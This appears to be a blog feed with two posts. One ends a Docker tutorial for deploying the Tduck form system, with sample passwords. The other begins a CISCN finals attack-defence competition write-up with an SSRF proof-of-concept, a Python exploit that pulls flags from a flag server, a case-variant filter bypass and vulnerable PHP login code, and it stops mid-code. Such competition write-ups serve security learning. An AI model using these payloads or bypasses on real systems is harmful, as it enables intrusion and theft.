class="string">SPRING_REDIS_HOST=$REDIS_HOST</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_REDIS_PORT=$REDIS_PORT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">AJ_CAPTCHA_ENABLE=false</span></span><br><span class="line"><span class="comment"># 老苏新增邮件设置</span></span><br><span class="line">    <span class="comment">#  - SPRING_MAIL_HOST=$MAIL_HOST</span></span><br><span class="line">    <span class="comment">#  - SPRING_MAIL_USERNAME=$MAIL_USERNAME</span></span><br><span class="line">    <span class="comment">#  - SPRING_MAIL_PASSWORD=$MAIL_PASSWORD</span></span><br><span class="line">    <span class="comment">#      - SPRING_REDIS_PASSWORD=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_APPID=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_SECRET=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_TOKEN=</span></span><br><span class="line">    <span class="comment">#      - WX_MP_CONFIGS_AESKEY=</span></span><br><span class="line">    <span class="comment">#      - OSS_OSSTYPE=</span></span><br><span class="line">    <span class="comment">#      - OSS_ENDPOINT=</span></span><br><span class="line">    <span class="comment">#      - OSS_ACCESSKEYID=</span></span><br><span class="line">    <span class="comment">#      - OSS_ACCESSKEYSECRET=</span></span><br><span class="line">    <span class="comment">#      - OSS_BUCKETNAME=</span></span><br><span class="line">    <span class="comment">#      - OSS_DOMAIN=</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;wbsu2003/tduck&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">23569</span><span class="string">:80</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tduck-redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6.2.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">36379</span><span class="string">:6379</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis_data:/data</span></span><br><span class="line">  <span class="attr">redis-commander:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis-commander</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">redis-commander</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rediscommander/redis-commander:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_HOSTS=local:$REDIS_HOST:$REDIS_PORT</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;28083:8081&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tduck-mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=$MYSQL_ROOT_PASSWORD</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=$MYSQL_DATABASE</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">43033</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql_data3:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./tduck-platform/doc:/docker-entrypoint-initdb.d:ro</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql_data3:</span></span><br><span class="line">  <span class="attr">nginx_log:</span></span><br><span class="line">  <span class="attr">redis_data:</span> </span><br></pre></td></tr></table></figure><p><code>.env</code> 文件，用的官方标准的，只配置了 <code>mysql</code> 和 <code>redis</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">MYSQL_DATABASE=tduck</span></span><br><span class="line"><span class="string">MYSQL_ROOT_PASSWORD=abc123123</span></span><br><span class="line"><span class="string">SPRING_DATASOURCE_URL=jdbc:mysql://tduck-mysql/tduck?serverTimezone=Asia/Shanghai</span></span><br><span class="line"><span class="string">SPRING_DATASOURCE_NAME=root</span></span><br><span class="line"><span class="string">REDIS_HOST=tduck-redis</span></span><br><span class="line"><span class="string">REDIS_PORT=6379</span> </span><br></pre></td></tr></table></figure><p>构建镜像和容器运行的基本命令如下👇</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 新建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取后端代码</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/TDuckApp/tduck-platform.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取前端代码</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/TDuckApp/tduck-front.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 Dockerfile 、supervisord.conf、nginx.conf、docker-compose.yaml、.env 五个文件放进 tduck 目录中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建镜像</span></span><br><span class="line">docker build -t wbsu2003/tduck:v1 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> --user root -it tduck /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键删除</span></span><br><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><p>目录结构👇</p><p><img src="https://img-blog.csdnimg.cn/img_convert/36376f3ede7175a44782474683622da4.png"></p><h1 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h1><ul><li>在群晖 <code>docker</code> 目录中新建子目录 <code>tduck</code></li><li>下载 <a href="https://github.com/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip">https://github.com/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip</a> 文件，如果 <code>github</code> 抽风了，可以从镜像站点下载 <a href="https://hub.fastgit.org/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip">https://hub.fastgit.org/wbsu2003/Dockerfile/raw/main/tduck/tduck.zip</a></li><li>将 <code>tduck.zip</code> 上传到 <code>tduck</code> 目录再解压</li></ul><blockquote><p>尽量不要在电脑上先解压再上传，因为 <code>.env</code> 默认是看不到的，需要打开显示隐藏文件，需避免拷贝文件丢失导致一键启动出错</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d027403b86b8928ad1d54b3ae59d20ae.png"></p><p><code>__MACOSX</code> 和 <code>tduck.zip</code> 可以删掉，不删也无所谓的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f7e4a8fd61ef5c0a39ed31bde60c45e0.png"></p><ul><li><p>根据需要修改 <code>docker-compose.yaml</code> 文件，主要应该就是端口，如果你要修改数据库可以编辑 <code>.env</code> 文件，理论上通过修改 <code>jdbc</code> 可以直接使用群晖自带的 <code>mariadb</code></p></li><li><p>用 <code>SSH</code> 客户端登录到群晖，在 <code>tduck</code> 目录中执行一键启动</p></li></ul><blockquote><p>老苏常用的<code>SSH</code> 客户端主要是 <code>Finalshell</code> 和 <code>PuTTY</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 docker 目录</span></span><br><span class="line"><span class="built_in">cd</span> /volume2/docker/tduck</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键启动</span></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><blockquote><p>第一次执行会有拉取镜像的动作</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1f01d5aa276aa511f65e4b8337e43bf1.png"></p><blockquote><p>如果最终 <code>4</code> 个容器都是 <code>done</code> ，表示创建成功！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d2b6b6359ac1b1e2779031223ba1a7e5.png"></p><p>在 <code>docker</code> 容器中能看到👇下面 <code>4</code> 个容器正在运行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/83c4474c80b600f4fc5bf701a4bc8222.png"></p><p>在浏览器中输入 <code>http://群晖IP:23569</code>，就能看到主界面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/34e7bdd1913e2278f7524d9f72688661.png"></p><p>点右上角的 <code>登录</code>，因为没设置微信扫码，所以一直是转圈的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/56cc6500894136b3a540ab3e924e2b0f.png"></p><p>系统有个默认的账号 <code>test@tduckapp.com</code>，密码：<code>12345678</code></p><blockquote><p>官网有点坑，写的默认账号是 <code>test@tduck.com</code></p></blockquote><h2 id="邮件注册"><a href="#邮件注册" class="headerlink" title="邮件注册"></a>邮件注册</h2><p>如果你需要自己注册账号，比较简单的方法是增加邮件的支持。</p><ul><li>需要去掉 <code>docker-compose.yaml</code> 中红框中 3 行前面的 <code>#</code> 号注释</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/c0d578bc60cbbe3477013a074da143c3.png"></p><ul><li>在 <code>.env</code> 最后面增加下面 <code>3</code> 行</li></ul><blockquote><p>请按你自己的邮箱设置进行填写</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">MAIL_HOST=smtp.88.com</span></span><br><span class="line"><span class="string">MAIL_USERNAME=wbsu2003@88.com</span></span><br><span class="line"><span class="string">MAIL_PASSWORD=&lt;用于登录第三方邮件客户端的专用密码&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>先一键删除再一键启动</li></ul><blockquote><p>任何时候，删除操作还是要慎重</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一键删除</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键启动</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键停止</span></span><br><span class="line">docker-compose stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键重启</span></span><br><span class="line">docker-compose restart </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/9a722dc0ab22aee2e89f265694021241.png"></p><p>选择用邮箱注册</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b6316964e4abc79291a6c36ff27655e9.png"></p><p>顺利的话很快就会收到注册验证码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e40c73aed2ce13ba3f64ed53dbf1d1e5.png"></p><p>填入验证码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0d5926c8507c310c2fec1598ab7a0000.png"></p><p>登录成功后的主界面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a87307f5e64c8774172474bb46ecc65b.png"></p><p>进入模板中心，创建空白模板</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a29ba48aaec68248844ce4b1f34714a2.png"></p><p>可以拖拽进行设计</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c921e01b0154404c2d9e551e7bcd812f.png"></p><p>如果你拖不动，是因为组件在线的上方</p><p><img src="https://img-blog.csdnimg.cn/img_convert/580e11de8b458b500919f01c6709247e.png"></p><p>拖到下方才行</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dbdd58cc1dc948b3df3690470f591aca.png"></p><p>预览一下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2bc80300636efba9c4b0345587fc67b7.png"></p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><blockquote><p>tduck-platform: Tduck-填鸭收集器是一款开源的表单在线收集系统，后台基于SpringBoot+MybatisPlus+MySql+Redis，前端基于Vue ElementUI开发，功能强大，界面美观。keywords：问卷&#x2F;表单&#x2F;信息收集<br>地址：<a href="https://gitee.com/TDuckApp/tduck-platform">https://gitee.com/TDuckApp/tduck-platform</a></p></blockquote><blockquote><p>Tduck填鸭<br>地址：<a href="https://doc.tduckapp.com/">https://doc.tduckapp.com/</a></p></blockquote><blockquote><p>java - How to dockerize maven project? and how many ways to accomplish it? - Stack Overflow<br>地址：<a href="https://stackoverflow.com/questions/27767264/how-to-dockerize-maven-project-and-how-many-ways-to-accomplish-it">https://stackoverflow.com/questions/27767264/how-to-dockerize-maven-project-and-how-many-ways-to-accomplish-it</a></p></blockquote><blockquote><p>使用Docker运行Tduck | 戴戴的Linux<br>地址：<a href="https://daishenghui.club/2021/06/30/categories/Linux/%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8CTduck/#%E5%8D%8A%E5%B0%8F%E7%99%BD%E7%AF%87">https://daishenghui.club/2021/06/30/categories/Linux/%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8CTduck/#%E5%8D%8A%E5%B0%8F%E7%99%BD%E7%AF%87</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;在线表单收集系统Tduck（docker篇）&quot;&gt;&lt;a href=&quot;#在线表单收集系统Tduck（docker篇）&quot; class=&quot;headerlink&quot; title=&quot;在线表单收集系统Tduck（docker篇）&quot;&gt;&lt;/a&gt;在线表单收集系统Tduck（docker</summary>
      
    
    
    
    <category term="code" scheme="https://lhhxs.github.io/categories/code/"/>
    
    
    <category term="tduck" scheme="https://lhhxs.github.io/tags/tduck/"/>
    
    <category term="docker" scheme="https://lhhxs.github.io/tags/docker/"/>
    
    <category term="java" scheme="https://lhhxs.github.io/tags/java/"/>
    
    <category term="nodejs" scheme="https://lhhxs.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>2021 CISCN 决赛杂记</title>
    <link href="https://lhhxs.github.io/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/"/>
    <id>https://lhhxs.github.io/2022/09/10/writeup/2021%20CISCN%20%E5%86%B3%E8%B5%9B%E6%9D%82%E8%AE%B0/</id>
    <published>2022-09-09T17:27:02.778Z</published>
    <updated>2022-09-09T17:27:02.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><p>第一天赛制是awd+可信计算，awd先放了两道web两道pwn，可信计算放了一题。放的web分别是10.1.x.2和10.1.x.4，为了方便下面称为web2和web4，下午两三点的时候放出了web10.1.x.3，后面称为web3。</p><blockquote><p>这里的exp我用了自己的AWD框架进行了封装，要看直接当成正常的requests请求就行。</p></blockquote><p>比赛的拓扑是80只队，靶机ip是10.1.{队伍id}.{题目id}。</p><p>队伍负责防御的师傅发现靶机没有py，脚本不能run，上的phplog防御导致了一波宕机之后我们WEB心态就有点小崩。</p><p>顺便一提这次的awdweb跟以前打过的awdweb很不一样，最明显的是控权了，设置了很多disable_Function避免攻击队对靶机造成破坏，已经设置了独特的flag请求方式。印象里flag的获得方式一直是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这次awd安恒把flag整成了这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://flagserver.top/index.php?token=xxxxxx&quot;</span>) <span class="comment">// 远程请求flagserver</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl http://flagserver.top/index.php?token=xxxxxx&quot;</span>) <span class="comment">// 或者直接调用curl请求</span></span><br></pre></td></tr></table></figure><p>大概就是拿到权限之后需要用靶机再次发起请求，请求远程服务器拿到flag再提交一次。还有就是由于set_time_limit和ignore_user_abort两个函数都被过滤了，不死马写不上了，至少在比赛结束时，我们的靶机都是挺干净的。</p><p>9点20分的时候白泽就拿到了web的一血，不清楚他们有没有打满第一轮，第二轮的时候就有几只队伍同样打通了。</p><p>由于延时流量，没有很及时的上车，也没扫出来洞但是其实这个洞很明显的，但是D盾没扫出来，然后主要是我当时判断大家都出的这么快应该是框架洞，就一直在尝试tp5的poc，以及eval之类的命令执行函数，完美的错过了点，后面关掉了强制路由变量还被check判down了。</p><p>大概在四五十分的时候PWN爷拿到了一血，把分数稳定了下来，然后白泽和我们分别拿了可信计算的一二血，10点开始我们的web2就上车写了exp，当时写的比较及时，写完之后还能打四五十只队，过了两轮就打不了多少了，大家都拿着流量上车了，然后应该是第五轮我们patch上了，然后我们短暂的体验了一会儿第一（虽然顶了还没两轮就很快就下去了，而且很快WEB2又被新payload打了）。</p><p>回到这个洞，简单的POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index/Api/curlfun?url=http://flagserver.top/index.php?token=xxxxxx</span><br></pre></td></tr></table></figure><p>tp5框架，可以看一下这里的逻辑，调用了Api控制器的curlfun函数，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//curl获取数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curlfun</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$params</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$method</span> = <span class="string">&#x27;GET&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$opts</span> = <span class="keyword">array</span>(CURLOPT_TIMEOUT =&gt; <span class="number">10</span>, CURLOPT_RETURNTRANSFER =&gt; <span class="number">1</span>, CURLOPT_SSL_VERIFYPEER =&gt; <span class="literal">false</span>, CURLOPT_SSL_VERIFYHOST =&gt; <span class="literal">false</span>, CURLOPT_HTTPHEADER =&gt; <span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据请求类型设置特定参数 */</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="variable">$url</span> . <span class="string">&#x27;?&#x27;</span> . <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="title function_ invoke__">substr</span>(<span class="variable">$opts</span>[CURLOPT_URL],<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span> :</span><br><span class="line"><span class="comment">//判断是否传输文件</span></span><br><span class="line"><span class="variable">$params</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="variable">$url</span>;</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_POST] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_POSTFIELDS] = <span class="variable">$params</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span> :</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始化并执行curl请求 */</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt_array</span>(<span class="variable">$ch</span>, <span class="variable">$opts</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$error</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$error</span>)&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提交一个url就可以直接请求了，很遗憾当时没有立刻找出来，不过后来也给我提供了思路，毕竟awd以前都是奔着命令执行拿shell去的，这次awd有ssrf就够用了，要注意curl，file_get_contents之类的函数。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp1</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp1 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># 黑名单检测</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp1.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">f&quot;http://flAgserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp1.request(url=ip + <span class="string">&quot;index/Api/curlfun&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, headers=<span class="literal">None</span>, cookies=<span class="literal">None</span>, params=params, data=<span class="literal">None</span>, files=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 提交 flag</span></span><br><span class="line">    exp1.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>这里的patch我们直接把flag过滤了（这里记得大小写不敏感，有队伍只过滤了flag，又被我们用flAg打上了）</p><p>patch完之后web2没维持两轮绿灯又被打了，和队伍师傅看流量又搞到了第二个payload。。</p><p>话说在两周前内部赛的时候我们队伍就有一名WEB手沉迷改后台密码，以至于后面长了记性，每次都记得先看一下密码，但无奈这次后台的密码我赛时没有找到，主要是翻看了config文件和其他文件找数据，没有仔细整理登录的链，其实这题不需要登录也可以绕过，但是不打紧，当时抄了攻击队登录的的Cookies接着又上车了，很舒服。</p><p>exp，直接用burp转的，当时写的比较久，因为后来发现是要token的，但是还是打了比较多的队，同理，大概一小时之后能打的靶机又没剩几个了，再同理，还有队伍用flAG能打的。</p><p>跟踪一下这个payload，我们请求的是aiyx下的System控制器backupsbase方法，跟进到System控制器，这个System控制器有点意思，可以看到他是继承自Base的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">System</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;otype != <span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error!&#x27;</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进Base基类的__construct()。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//session_unset();</span></span><br><span class="line"><span class="comment">//验证登录</span></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;denglu&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;userid&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;请先登录！&#x27;</span>,<span class="string">&#x27;login/login&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;token&#x27;</span>]) || <span class="variable">$login</span>[<span class="string">&#x27;token&#x27;</span>] != <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;dbapp&#x27;</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;login/logout&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$request</span> = \think<span class="title class_">\Request</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$contrname</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">controller</span>();</span><br><span class="line">       <span class="variable">$actionname</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">       </span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;contrname&#x27;</span>,<span class="variable">$contrname</span>);</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;actionname&#x27;</span>,<span class="variable">$actionname</span>);</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">       <span class="variable 